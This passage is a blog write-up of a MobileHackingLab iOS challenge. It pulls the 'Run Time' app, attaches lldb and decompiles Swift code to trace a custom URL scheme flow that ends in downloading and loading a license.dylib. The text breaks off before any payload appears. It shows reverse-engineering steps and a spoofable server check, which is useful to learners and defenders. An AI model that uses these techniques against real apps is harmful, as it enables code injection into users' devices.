---
layout: post
title: MobileHackingLab iOS Application Security Lab - Run Time Dynamic Library Injection Challenge write-up
---
Welcome to the iOS Application Security Lab: Run Time Dynamic Library Injection Challenge. This challenge focuses on a fictitious app called Run Time , which tracks the steps while running. Your objective is to bypass the app's protections, deliver the exploit and gain code execution utilizing the dynamic library injection.  
[![iOS Application Security Lab - Run Time Dynamic Library Injection Challenge](https://lh3.googleusercontent.com/pw/AP1GczPuKmYQYOSdZCEQtXXg1KLI2MQkmpjLT3Mv9cCoWyRi02-qupOyvw3qtxESMwsR3B2rISVpXKPJi-c5EfiNlnh_l4vz-C_BArsoGiVrUxUXhEnNJ-LJF_nU0waDoCPJpco23ELnfrYsAROV2WO6mJoa=w500-h500-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczPuKmYQYOSdZCEQtXXg1KLI2MQkmpjLT3Mv9cCoWyRi02-qupOyvw3qtxESMwsR3B2rISVpXKPJi-c5EfiNlnh_l4vz-C_BArsoGiVrUxUXhEnNJ-LJF_nU0waDoCPJpco23ELnfrYsAROV2WO6mJoa=w500-h500-s-no?authuser=0){:target="_blank"} <br/>**Figure: iOS Application Security Lab - Run Time Dynamic Library Injection Challenge** <br/><br/>

# Objective
Your task is to inject a custom dynamic library into the Run Time app and manipulate its behavior while preparing a fake environment to deliver the exploit.

# Prerequisites
Below tools are used during this post:
- [IDA](https://hex-rays.com/ida-pro/){:target="_blank"} or other disassembler tools or your choice
- LLDB (Standalone or XCode lldb)
- A jailbroken iOS device
- [ios-deploy](https://github.com/ios-control/ios-deploy){:target="_blank"}
- [ldid](https://formulae.brew.sh/formula/ldid){:target="_blank"}

# Retrieve IPA and run the app
[MobileHackingLab](https://mobilehackinglab.com){:target="_blank"} provides the Corellium iOS emulator for us to run and test the app on the web portal with ease, however I found the perfomance is a bit slow hence for this lab we will pull the IPA and install it on our own iOS device

## Pull Runtime IPA from Correlium emulator
From the portal, start the lab and wait a few minutes for it to setup and turn on the emulator. Once it's ready, navigate to folder `/private/var/containers/Bundle/Application` where contains bundle applications. From here it's a bit tricky to identify which application is Runtime, however, there is a trick to do that by clicking on **Last Modified** column a few times to sort app modified time, there will be only one folder stands out from others, it is the Runtime app bundle. Click the ellipsis vertically aligned icon in that column and select **Copy filepath**, note it down for the next step as we will need this to pull the app bundle from the emulator

[![Copy Runtime file path](https://lh3.googleusercontent.com/pw/AP1GczOzBC75wOJRFbOJzEIXIx7AID5dZls7L53A9pH9OyVZDvk6tGViywOJI5PCVSeNohqxPK5M9Fu4K29lDHznojH_7YEiTNykWB_xhm55_QOt3iEJqd7bTfAKYD9iRWKnsigiFDna3cI81BsmzXZoEFJi=w1990-h1382-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczOzBC75wOJRFbOJzEIXIx7AID5dZls7L53A9pH9OyVZDvk6tGViywOJI5PCVSeNohqxPK5M9Fu4K29lDHznojH_7YEiTNykWB_xhm55_QOt3iEJqd7bTfAKYD9iRWKnsigiFDna3cI81BsmzXZoEFJi=w1990-h1382-s-no?authuser=0){:target="_blank"} <br/>**Figure: Locate and Copy Runtime app file path** <br/><br/>

Next step is to download OVPN file given in the portal and connect to the VPN, I'm using `openvpn` command `sudo openvpn runtime_lab.ovpn` to start and connect to the VPN.

Once connected to VPN, we can pull the app bundle using `scp` command with the path noted in earlier step, given emulator IP address as `10.11.1.1` and default password `alpine`: 
```bashscript
$ scp -r root@10.11.1.1:/private/var/containers/Bundle/Application/2A53363E-8C74-4D04-B7E4-6A447D2B2ACA ./
root@10.11.1.1's password: 
.com.apple.mobile_container_manager.metadata.plist                         100%  480     0.9KB/s   00:00    
01J-lp-oVM-view-Ze5-6b-2t3.nib                                             100% 3844     7.5KB/s   00:00    
UIViewController-01J-lp-oVM.nib                                            100%  924     1.9KB/s   00:00    
Info.plist                                                                 100%  258     0.5KB/s   00:00    
E5R-lq-rrh-view-FfF-iw-deh.nib                                             100% 9203    19.1KB/s   00:00    
TabbedController.nib                                                       100% 3587     7.5KB/s   00:00    
UIViewController-E5R-lq-rrh.nib                                            100% 1476     3.1KB/s   00:00    
SummaryViewController.nib                                                  100% 1850     3.8KB/s   00:00    
SubscribeViewController.nib                                                100% 1669     3.4KB/s   00:00    
WnV-KQ-Z6y-view-XtF-oz-k5t.nib                                             100% 8165    17.1KB/s   00:00    
y2R-vu-mEO-view-EGr-A3-sD3.nib                                             100% 3500     7.2KB/s   00:00    
f4M-kz-J6p-view-DA1-rR-auQ.nib                                             100%   13KB  26.7KB/s   00:00    
Info.plist                                                                 100%  491     1.0KB/s   00:00    
ueM-xY-xDZ-view-wu2-oQ-BPs.nib                                             100% 6324    13.0KB/s   00:00    
LoginControllerID.nib                                                      100% 1535     3.2KB/s   00:00    
ProfileViewController.nib                                                  100% 1640     3.4KB/s   00:00    
Runtime                                                                    100%  349KB 181.6KB/s   00:01    
CodeResources                                                              100% 7469    15.4KB/s   00:00    
Info.plist                                                                 100% 1767     3.5KB/s   00:00    
PkgInfo                                                                    100%    8     0.0KB/s   00:00    
Assets.car                                                                 100% 1662KB 429.6KB/s   00:03    
embedded.mobileprovision                                                   100%   12KB  25.6KB/s   00:00    
VersionInfo.plist                                                          100%  255     0.5KB/s   00:00    
Runtime.mom                                                                100%  566     1.2KB/s   00:00    
Runtime.omo                                                                100%  704     1.5KB/s   00:00    
BundleMetadata.plist                                                       100%  650     1.3KB/s   00:00 
```

## Install Runtime bundle on a jailbroken device
Now with the bundle ready, connect the jailbroken device to the laptop via USB cable and use `ios-deploy` command to install the bundle on device
```bashscript
$ ios-deploy --bundle 2A53363E-8C74-4D04-B7E4-6A447D2B2ACA/Runtime.app
[....] Waiting for iOS device to be connected
[....] Using xxxx (iPhone, iphoneos, arm64, 15.7.3) a.k.a. 'iPhone_1573'.
------ Install phase ------
[  0%] Found xxxx (iPhone, iphoneos, arm64, 15.7.3) a.k.a. 'iPhone_1573'. connected through USB, beginning install
[  5%] Copying 2A53363E-8C74-4D04-B7E4-6A447D2B2ACA/Runtime.app/META-INF/ to device
...
[ 48%] Copying 2A53363E-8C74-4D04-B7E4-6A447D2B2ACA/Runtime.app/Info.plist to device
[ 49%] Copying 2A53363E-8C74-4D04-B7E4-6A447D2B2ACA/Runtime.app/Info.plist to device
[ 49%] Copying 2A53363E-8C74-4D04-B7E4-6A447D2B2ACA/Runtime.app/PkgInfo to device
[ 52%] CreatingStagingDirectory
[ 57%] ExtractingPackage
[ 60%] InspectingPackage
[ 60%] TakingInstallLock
[ 65%] PreflightingApplication
[ 65%] InstallingEmbeddedProfile
[ 70%] VerifyingApplication
[ 75%] CreatingContainer
[ 80%] InstallingApplication
[ 85%] PostflightingApplication
[ 90%] SandboxingApplication
[ 95%] GeneratingApplicationMap
[100%] Installed package Runtime.app/
```

We can observe from the terminal log and on the device home screen there is new app **Runtime** installed successfully. In some cases you got error on the terminal, highly it is due to codesign issues, you might need to sign the bundle with your certificate first using `codesign` or other signing apps such as [iOS App Signer](https://www.iosappsigner.com/) then retry, it should be fine.

## Run the app
It's time to run the app and observe the functionalities. 
[![Login screen](https://lh3.googleusercontent.com/pw/AP1GczPgs73q61Bc6d0t6bPJ9wdW4GyEK8wPvVdBadEvWIn2guqC9JRUuLqxM6aMBlR3hRSiEqX3Gb0zqOZOkalCUEqfSQifdEbBw6zw72b__CnC7AjzwxS7CprTI4c5kEFsCm91mXIoXd24QMOGWXcibTOn=w446-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczPgs73q61Bc6d0t6bPJ9wdW4GyEK8wPvVdBadEvWIn2guqC9JRUuLqxM6aMBlR3hRSiEqX3Gb0zqOZOkalCUEqfSQifdEbBw6zw72b__CnC7AjzwxS7CprTI4c5kEFsCm91mXIoXd24QMOGWXcibTOn=w892-h1582-s-no?authuser=0){:target="_blank"}[![Signup screen](https://lh3.googleusercontent.com/pw/AP1GczO-LLHidsvVZ402Uds4KGD9Hqx5Rco2bEKzyT6iUgdsx_ZXaw_UB6w4MLHVhQSqOTXelsbGQ2qpyldN84GjoQK_Cr9GUHVj5kb_oEj7EVvHDvhdiHnuKQa7DsJB6uiSsQJtmLtNjwjtnYIYz01s8QBH=w446-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczO-LLHidsvVZ402Uds4KGD9Hqx5Rco2bEKzyT6iUgdsx_ZXaw_UB6w4MLHVhQSqOTXelsbGQ2qpyldN84GjoQK_Cr9GUHVj5kb_oEj7EVvHDvhdiHnuKQa7DsJB6uiSsQJtmLtNjwjtnYIYz01s8QBH=w446-h791-s-no?authuser=0){:target="_blank"}

Those 2 screens are Login and Signup, to create local account for sign in to the app. Let create one account in Sign up screen to explor further functions, however, it's stuck to sign up an account due to app UI broken issue as the keyboard covers other fields which is blocking us from continuing.

[![Signup screen](https://lh3.googleusercontent.com/pw/AP1GczNCsh_dJYoqmk_aVKso7U31NprOW89RfV9LUMnoxfsOsNpXFJzQth-ATIjEQCX9HCXWxXt0cai2OldfOkeXtSVCYE8pkSN_hLxOEd9t4X67b_2ltngQ9YCJ2kR0BGHJW3SGQelASracrox6Xyp64S8D=w446-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczNCsh_dJYoqmk_aVKso7U31NprOW89RfV9LUMnoxfsOsNpXFJzQth-ATIjEQCX9HCXWxXt0cai2OldfOkeXtSVCYE8pkSN_hLxOEd9t4X67b_2ltngQ9YCJ2kR0BGHJW3SGQelASracrox6Xyp64S8D=w446-h791-s-no?authuser=0){:target="_blank"}<br/>**Figure: Sign Up screen blocking by keyboard** <br/><br/>

Not sure if this is intentional by the developers of this challenge or they didnt expect us to run on a small screen size device, anyway we need to figure out a way to hide this keyboard first. In this case we can attach a debugger to the running app and using LLDB command to hide the keyboard, but before doing that, let check if the given executable **Runtime** has debugging permission or not. We can use `ldid` command to quickly check:

```bashscript
bash-3.2$ ldid -e Runtime.app/Runtime
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>application-identifier</key>
	<string>9935WJZD4N.com.mobilehackinglab.runtime</string>
	<key>com.apple.developer.team-identifier</key>
	<string>9935WJZD4N</string>
	<key>get-task-allow</key>
	<true/>
</dict>
</plist>
```

As we can see `get-task-allow` is `true` which mean the app is debuggable. Let run the app and use LLDB of XCode to attach and debugging (you can use standalone LLDB version)

[![XCode attach debugger](https://lh3.googleusercontent.com/pw/AP1GczM6bomryCXE7PwH8r9E_wAHsIWoMZwB7FZXpUTxtop7JEdyOblQo9nU3UL1RO8Us1gnPG-JQKDBO9FzFtd8TMZsj-mxRolk8zIhwEFZtBsaq0m8cTr5Al3efDu9wwbtpMT1Y7guGVyqwoSK4d_O716_=w2160-h1264-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczM6bomryCXE7PwH8r9E_wAHsIWoMZwB7FZXpUTxtop7JEdyOblQo9nU3UL1RO8Us1gnPG-JQKDBO9FzFtd8TMZsj-mxRolk8zIhwEFZtBsaq0m8cTr5Al3efDu9wwbtpMT1Y7guGVyqwoSK4d_O716_=w2160-h1264-s-no?authuser=0)
{:target="_blank"}
<br/>**Figure: Using XCode debugger to attach Runtime process** <br/><br/>

Once attached successfully, from lldb prompt `(lldb)` we will send this command to hide the keyboard followed by `continue` command to resume the app:
```bashscript
(lldb) expr -l objc++ -O -- [[UIApplication sharedApplication] sendAction:@selector(resignFirstResponder) to:nil from:nil forEvent:nil]
```

[![Dismiss keyboard](https://lh3.googleusercontent.com/pw/AP1GczPZyJ5ldAzvOz8Wo_lcP2R589PrQnO5_v-eHlgYdxkjSV_rgIT-Gal89txxUNUia9m0TbmpiRXx3_t0gQln7g66pFXUBA4CCDkqwfxqRB3OeSGEOgv8zcMs1WnU7BQWXSDxMQzgJzQlsrh5-LC8phvv=w2540-h1582-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczPZyJ5ldAzvOz8Wo_lcP2R589PrQnO5_v-eHlgYdxkjSV_rgIT-Gal89txxUNUia9m0TbmpiRXx3_t0gQln7g66pFXUBA4CCDkqwfxqRB3OeSGEOgv8zcMs1WnU7BQWXSDxMQzgJzQlsrh5-LC8phvv=w2540-h1582-s-no?authuser=0)<br/>**Figure: Using lldb command to dismiss keyboard** <br/><br/>

As we can see, the keyboard is being dismissed and now we can tap on password field to continue, it will show up the keyboard again and again, we need to repeat above process until able to tap on **Create Local Account** button to complete the sign up process. Once it's done, we can back to the Sign in screen to login the app, again same UI issue we need debugger help to manually dismiss the keyboard. 

After login successfully, there are 3 screens **Summary**, **ProPack** and **Account**, app looks simple?

[![Summary screen](https://lh3.googleusercontent.com/pw/AP1GczOVdIovsA_jZo6fBCcdlKOJXdQWibuPyHzfPDvAUZPBaVH0SAYKlN5qu3nt1dCEZHKNbgQ9Bh_kt7-8OmI76e6TmSkZjmkGQNdcfblPLRuVH95QAiIphWAh4m2afVSG59TyBHeoSLH_pQz_C9-NwRz-=w445-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczOVdIovsA_jZo6fBCcdlKOJXdQWibuPyHzfPDvAUZPBaVH0SAYKlN5qu3nt1dCEZHKNbgQ9Bh_kt7-8OmI76e6TmSkZjmkGQNdcfblPLRuVH95QAiIphWAh4m2afVSG59TyBHeoSLH_pQz_C9-NwRz-=w445-h791-s-no?authuser=0){:target="_blank"}[![Pro Pack screen](https://lh3.googleusercontent.com/pw/AP1GczP-CLByjG68t2NRdzisI1kikdaCATQ55mmEnKfbokkTo5Bzc9AekjK7a39CWCtGCeCV_qJuRFfuInH278xQKUzTuLIkMzzJLsnoDPRLX8U-o6GGHr7DWYLYIx3uvGwbg2PV-Jvwt6gvKiFpZ_tO-irY=w445-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczP-CLByjG68t2NRdzisI1kikdaCATQ55mmEnKfbokkTo5Bzc9AekjK7a39CWCtGCeCV_qJuRFfuInH278xQKUzTuLIkMzzJLsnoDPRLX8U-o6GGHr7DWYLYIx3uvGwbg2PV-Jvwt6gvKiFpZ_tO-irY=w445-h791-s-no?authuser=0){:target="_blank"}[![Account screen](https://lh3.googleusercontent.com/pw/AP1GczOWddhvF8SYZ-OeCuGWskEsrTFigQfxaWBKdm9uw3MdmRlaCVQlkZ233LoenSnjmyPvrHag2RfvKr0KAf5q3fhg6hwQtW2iROAb2kPnXJtLajwg-ZFIdqOXxwSuKSsWEaudXPvhYsmkJLcI8opv26pC=w445-h791-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczOWddhvF8SYZ-OeCuGWskEsrTFigQfxaWBKdm9uw3MdmRlaCVQlkZ233LoenSnjmyPvrHag2RfvKr0KAf5q3fhg6hwQtW2iROAb2kPnXJtLajwg-ZFIdqOXxwSuKSsWEaudXPvhYsmkJLcI8opv26pC=w445-h791-s-no?authuser=0)
{:target="_blank"} 
**Figure: Summary, Pro Pack and Account screens** <br/><br/>

Playing around with those buttons all lead to **Pro Pack** screen which required to be a Pro subscription to use the app, either tap on **Subscribe Now!** or **Start Free Trial** will open dummy webpage `https://mhl.pages.dev/runtime/payment?license_type=pro` that is unusable. 

It's enough playing, let head to analysis part.

# Analysis
## Static Analysis
### Strings
A few strings that app is using that worth taking note here
```C
__cstring:000000010001DD00	0000002E	C	runtime://buypro?server=mhl.pages.dev/runtime
__cstring:000000010001DD30	0000004A	C	runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD
__cstring:000000010001DDA1	0000000E	C	mhl.pages.dev
__cstring:000000010001DDAF	0000000F	C	Invalid Server
__cstring:000000010001DDD0	0000001D	C	^[0-9]{4}-[0-9]{4}-[A-Z]{4}$
__cstring:000000010001DDED	00000008	C	http://
__cstring:000000010001DDF5	00000008	C	/health
__cstring:000000010001DDFD	0000000C	C	Invalid URL
__cstring:000000010001DE40	00000017	C	Invalid license format
__cstring:000000010001DE60	0000001A	C	/payment?license_type=pro
__cstring:000000010001DE7A	0000000A	C	/activate
__cstring:000000010001DE89	0000000A	C	/download
__cstring:000000010001DF34	0000000D	C	Content-Type
__cstring:000000010001DF50	00000019	C	application/octet-stream
__cstring:000000010001DF70	0000001E	C	Unable to store license file!
__cstring:000000010001DF8E	0000000E	C	license.dylib
__cstring:000000010001DFA0	00000028	C	Failed to move or load the license file
__cstring:000000010001E000	00000020	C	Failed to load the license file
__cstring:000000010001E020	0000002E	C	Unknown error occurred while loading library.
__cstring:000000010001E050	00000017	C	Something went wrong: 
__cstring:000000010001E067	00000010	C	register_device
__cstring:000000010001E080	00000024	C	Function register_device not found.
__cstring:000000010001E0F0	0000001C	C	Device registration failed.
__cstring:000000010001E110	00000045	C	Upgraded to Pro. Please wait for a decade before we add pro features
__cstring:000000010001E160	0000003E	C	Unexpected response from server (download path not available)
__cstring:000000010001E1A0	00000021	C	Unable to authenticate to server
```
There are custom URL schemes `runtime://`, server URL `mhl.pages.dev`, a few API endpoints (`/health`, `/payment`, `/activate`, `/download`), dynamic library name `license.dylib`, etc. We will analysis one by one to understand the app flow.

### Custom URL Scheme
As we can see from above strings, the app is using custom URL Scheme `runtime://`
```bashscript
runtime://buypro?server=mhl.pages.dev/runtime
runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD
```

From Apple document:

*Custom URL schemes provide a way to reference resources inside your app. Users tapping a custom URL in an email, for example, launch your app in a specified context.*

**Warning: URL schemes offer a potential attack vector into your app, so make sure to validate all URL parameters and discard any malformed URLs.**

Copy either above URL scheme and paste to device web browser to launch the app, it navigates to **Pro Pack** screen with a toast message "**Malformed response from server**". By searching this message using IDA Strings we found it's being used in `closure #1 in SubscribeController.verifyLicense(server:key:)` which is the callback handling from server.
```C
__cstring:000000010001E350 aMalformedRespo DCB "Malformed response from server",0
__cstring:000000010001E350                                         ; DATA XREF: closure #1 in SubscribeController.verifyLicense(server:key:):loc_100007F80↑o
__cstring:000000010001E350                                         ; closure #1 in SubscribeController.verifyLicense(server:key:)+480↑o ..
```

Before jumping to analysis `SubscribeController.verifyLicense(server:key:)`, let switch to IDA Functions Window to see if `SubscribeController` class has any methods

### Class `SubscribeController`
Why we choose this class among others? Because the app objective related to achieve Pro version, hence it should be the first to look around instead of wandering off.
[![Class SubscribeController](https://lh3.googleusercontent.com/pw/AP1GczPVMpqmVs4eHhiyoNTXNGXq4TwVVHrvww4m9vA77qXbG0TQyDADMPSGSprVcCW2PBqM95fqRzR7grIiavmJJQhp0v9kRnlHxL9vmR-UfyQeUcvt_Zak6NO--HLC9m7H2q0C6Qhu6Fhh4qmJ24_UVC3F=w1676-h968-s-no?authuser=0)](https://lh3.googleusercontent.com/pw/AP1GczPVMpqmVs4eHhiyoNTXNGXq4TwVVHrvww4m9vA77qXbG0TQyDADMPSGSprVcCW2PBqM95fqRzR7grIiavmJJQhp0v9kRnlHxL9vmR-UfyQeUcvt_Zak6NO--HLC9m7H2q0C6Qhu6Fhh4qmJ24_UVC3F=w1676-h968-s-no?authuser=0){:target="_blank"}
**Figure: Class SubscribeController** <br/><br/>

As we can see, beside `verifyLicense(server:key:)` methods, there are a few more look interesting such as `getLicenseFile(server:withToken:)`, `activateServer(server:)`, etc.

If you quickly jump to each of them and find the XREFs, you will find none. This is a bit weird, are they unused method? They aren't, if you pay attention enough you can tell this app was written in Swift, hence some optimization applied and no XREFs found were part of it. Worry not, we will have another way to verify it later.

### SubscribeController.verifyLicense(server:key:)(Swift::String server, Swift::String key) - 1st API request
By the toast message "**Malformed response from server**" and XREFs when launch the app by custom URL scheme, we know that `SubscribeController.verifyLicense(server:key:)` is being called. This method accepts 2 parameters `server` and `key`, they are both `String` type. To double confirm we can check `SceneDelegate.scene(_:openURLContexts:)` method where this is the place handle custom URL scheme or deeplinking.

```C
void __fastcall SceneDelegate.scene(_:openURLContexts:)(void *a1, __int64 a2)
{
  ...
  v169 = a1;
  v154 = a2;
  v150 = &swift_isaMask;
  v151 = "Fatal error";
  v152 = "Unexpectedly found nil while unwrapping an Optional value";
  v153 = "Runtime/SceneDelegate.swift";
  ...
  v146 = v148;
  if ( v148 )
  {
    ...
    while ( 1 )
    {
      ...
      v129 = &SubscribeController;
      v126 = objc_retainAutoreleasedReturnValue(objc_msgSend(v141, "URL"));
      static URL._unconditionallyBridgeFromObjectiveC(_:)();
      v132 = (__int64 (__fastcall *)(char *, char *, __int64))v156[2];
      v32 = v132(v31, v168, v155);
      v33 = URL.absoluteString.getter(v32);      
      v36 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("server", 6uLL, 1);
      ...
      v42 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("buypro", v134, v135 & 1);
      ...
LABEL_13:      
      if ( (v115 & 1) != 0 )
      {
        v43 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("buypro", 6uLL, 1);
        v44 = v190._object;
        v190 = v43;
        swift_bridgeObjectRelease(v44);
      }      
      v110 = objc_retainAutoreleasedReturnValue(objc_msgSend(v130, "URL"));
      v48 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("starttrial", 0xAuLL, 1);      
    ...
LABEL_24:      
        v54 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("trialKey", 8uLL, 1);        
      if ( (v93 & 1) != 0 )
      {        
        type metadata accessor for UIStoryboard();        
        v57 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Main", 4uLL, 1);        
        v85 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("TabbedController", 0x10uLL, v84 & 1)._object;        
        v88 = objc_retainAutoreleasedReturnValue(objc_msgSend(v86, "instantiateViewControllerWithIdentifier:", v87));        
        v58 = objc_opt_self(&OBJC_CLASS___UITabBarController);
        v89.super.super.isa = (Class)swift_dynamicCastObjCClassUnconditional(v88, v58, 0LL, 0LL);
        isa = v89.super.super.isa;
        -[objc_class setSelectedIndex:](v89.super.super.isa, "setSelectedIndex:", 1LL);
        type metadata accessor for UINavigationController(v90);
        ...
        if ( v178 )
        {          
          outlined destroy of UIWindow?(v82);
          v64 = objc_retain(v91);
          objc_msgSend(v83, "setRootViewController:", v91);
          objc_msgSend(v81, "makeKeyAndVisible");
        }
               
        v66 = type metadata accessor for SubscribeController(0LL);
        v77 = (_QWORD *)swift_dynamicCastClassUnconditional(v76, v66, 0LL, 0LL);
        v176 = v77;
        
        // ==== INVOKE SubscribeController.verifyLicense(server:key:)
        (*(void (__fastcall **)(__int64, __int64, __int64))((*v77 & *v150) + 0x80LL))(v72, v71, v70._countAndFlagsBits); )        
      }      
    }
    ..
}
```

This logic was written in Swift, with the help of the decompiler we can summarize the general logic as above (removed a number of Swift metadata logic that is irrelevant). It's parsing URL scheme query and parameter all the way until invoking `(*(void (__fastcall **)(__int64, __int64, __int64))((*v77 & *v150) + 0x80LL))(v72, v71, v70._countAndFlagsBits)` method. This is a result of the Swift compiler's internal calling convention for Swift functions, it's hard to tell exactly which method is being called. Swift, in contrast to languages like C or C++, uses dynamic dispatch and metadata to store information about function names and types. When Swift code is compiled, especially in optimized release builds, these optimizations can result in Indirect function calls through function pointers or tables, which might eliminate direct XREFs in the compiled binary.

To verify which method is being called, we can use a debugger to attach, set breakpoint and print out the address of that method, in this case it's `SubscribeController.verifyLicense(server:key:)` and the `server` value is `mhl.pages.dev/runtime` and `key` value is `1234-5678-ABCD` if `runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD` is used to launch the app.

Now let's jump in to `SubscribeController.verifyLicense(server:key:)` main implementation.

```C
Swift::Void __swiftcall SubscribeController.verifyLicense(server:key:)(Swift::String server, Swift::String key)
{
  ...
  v30_mhl_pages_dev_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                        "mhl.pages.dev",
                                        0xDuLL,
                                        1);
  v134 = &v154_mhl_pages_dev_string_constant;
  v154_mhl_pages_dev_string_constant = v30_mhl_pages_dev_string_constant;
  v133 = lazy protocol witness table accessor for type String and conformance String();
  v135_server_contains_mhl_pages_dev_boolean = StringProtocol.contains<A>(_:)(v134, v132, v132, v133);
  if ( (v135_server_contains_mhl_pages_dev_boolean & 1) != 0 )// if server contains "mhl.pages.dev"
  {
    v31_buypro_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("buypro", 6uLL, 1);    
    v112_is_key_equal_buypro_string = static String.== infix(_:_:)(
                                        v121_key._countAndFlagsBits,
                                        v121_key._object,
                                        v31_buypro_string_constant._countAndFlagsBits);
    if ( (v112_is_key_equal_buypro_string & 1) != 0 )// if key equals "buypro"?
    {
      v34 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("http://", 7uLL, 1);      
      DefaultStringInterpolation.appendLiteral(_:)(v34);      
      DefaultStringInterpolation.appendInterpolation<A>(_:)(
        v136,
        v132,
        &protocol witness table for String,
        &protocol witness table for String);
      v35 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
              "/payment?license_type=pro",
              0x19uLL,
              v105 & 1);
      ...
      DefaultStringInterpolation.appendLiteral(_:)(v35);
      URL.init(string:)(v36);
      ...
      objc_msgSend(v98, "openURL:options:completionHandler:", v97, isa, 0LL);
      ...
    }
    else // key is not equal "buypro"
    {
      // handle trial key flow
      ...
    }
  }
  else // server does not contain "mhl.pages.dev"
  {
    v68 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Invalid Server", 0xEuLL, 1);
    showToast(message:duration:sender:)(v68, v67, v113);
  }
}
```

This methods check if the passing `server` value contains string "**mhl.pages.dev**", otherwise it will toast a message "**Invalid Server**" (try this URL and you will see `runtime://starttrial?server=my.own.server.com&trialKey=1234-5678-ABCD`). Once the `server` is valid, it checks if it's **`buypro`** flow or **`starttrial`** flow by checking the `key` value. If it's **`buypro`** flow, it will open a webpage with URL `mhl.pages.dev/runtime/payment?license_type=pro` which leads to a dummy page and nothing interesting for us to dig, hence we will focus on **`starttrial`** flow logic.

```C
void __fastcall SceneDelegate.scene(_:openURLContexts:)(void *a1, __int64 a2)
{
...
    else // starttrial flow
    {
      v153[1] = v121_key;
      v86 = 1;
      v45_license_key_format_string = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                        "^[0-9]{4}-[0-9]{4}-[A-Z]{4}$",
                                        0x1CuLL,
                                        1);
        ... 
      v90 = StringProtocol.range<A>(of:options:range:locale:)(v87, 1024LL, v85, v85, v86, v116, v132);
      ...
      v151 = v88;
      v152 = v89_is_license_key_format_valid & 1;
      v84 = (v89_is_license_key_format_valid & 1) != 0;
      if ( (v89_is_license_key_format_valid & 1) != 0 )
      {
        v83 = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("Invalid license format", 0x16uLL, 1);        
        showToast(message:duration:sender:)(v83, v49, v113);
        return;
      }
      v50 = DefaultStringInterpolation.init(literalCapacity:interpolationCount:)(14LL, 1LL);
      v52_http_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)("http://", 7uLL, 1);      
      DefaultStringInterpolation.appendLiteral(_:)(v52_http_string_constant);      
      DefaultStringInterpolation.appendInterpolation<A>(_:)(
        v147,
        v132,
        &protocol witness table for String,
        &protocol witness table for String);
      v53_health_path_string_constant = String.init(_builtinStringLiteral:utf8CodeUnitCount:isASCII:)(
                                          "/health",
                                          v76,
                                          v77 & 1);      
      DefaultStringInterpolation.appendLiteral(_:)(v53_health_path_string_constant);      
      v54 = String.init(stringInterpolation:)(v81, v80);      
      URL.init(string:)(v54);
      ...      
      v145 = partial apply for closure #1 in SubscribeController.verifyLicense(server:key:);      
      v140 = _NSConcreteStackBlock;      
      v143 = thunk for @escaping @callee_guaranteed @Sendable (@guaranteed Data?, @guaranteed NSURLResponse?, @guaranteed Error?) -> ();      
      v70 = _Block_copy(&v140);      
      v73 = objc_retainAutoreleasedReturnValue(objc_msgSend(v72, "dataTaskWithURL:completionHandler:", v71, v70));      
      v139 = v73;
      objc_msgSend(v73, "resume");      
      v74(v125, v122);
    }
}
```

This flow basically validate if the provided `key` value is in the format of `^[0-9]{4}-[0-9]{4}-[A-Z]{4}$` (which it is if we are passing `trialKey=1234-5678-ABCD`), then it will concat the provided server from custom URL `mhl.pages.dev/runtime` with the path `/health` and make a `GET` request `- (NSURLSessionDataTask *)dataTaskWithURL:(NSURL *)url  completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler;` to the server `http://mhl.pages.dev/runtime/health` to retrieve the data. The response logic is handled in `v145 = partial apply for closure #1 in SubscribeController` block.

### closure #1 in SubscribeController.verifyLicense(server:key:)
```C
void __fastcall closure #1 in SubscribeController.verifyLicense(server:key:)(
        __int64 a1,
        __int64 a2,
        void *a3_NSURLResponse_obj,
        __int64 a4,
        UIViewController a5,
        _QWORD *a6,
        __int64 a7,
        __int64 a8)
{
  ...
  v8_NSURLResponse_obj = objc_retain(a3_NSURLResponse_obj);
  if ( a3_NSURLResponse_obj )
  {
    v10 = objc_opt_self(&OBJC_CLASS___NSHTTPURLResponse);
    v11_NSHTTPURLResponse_obj = swift_dynamicCastObjCClass(a3_NSURLResponse_obj, v10);
    if ( v11_NSHTTPURLResponse_obj )
    {
      v46_NSHTTPURLResponse_obj = (void *)v11_NSHTTPURLResponse_obj;
    }
    else
    {
      objc_release(a3_NSURLResponse_obj);
      v46_NSHTTPURLResponse_obj = 0LL;
    }
    v47_NSHTTPURLResponse_obj = v46_NSHTTPURLResponse_obj;
  }
  else
  {
    v47_NSHTTPURLResponse_obj = 0LL;
  }
  if ( !v47_NSHTTPURLResponse_obj )
  {
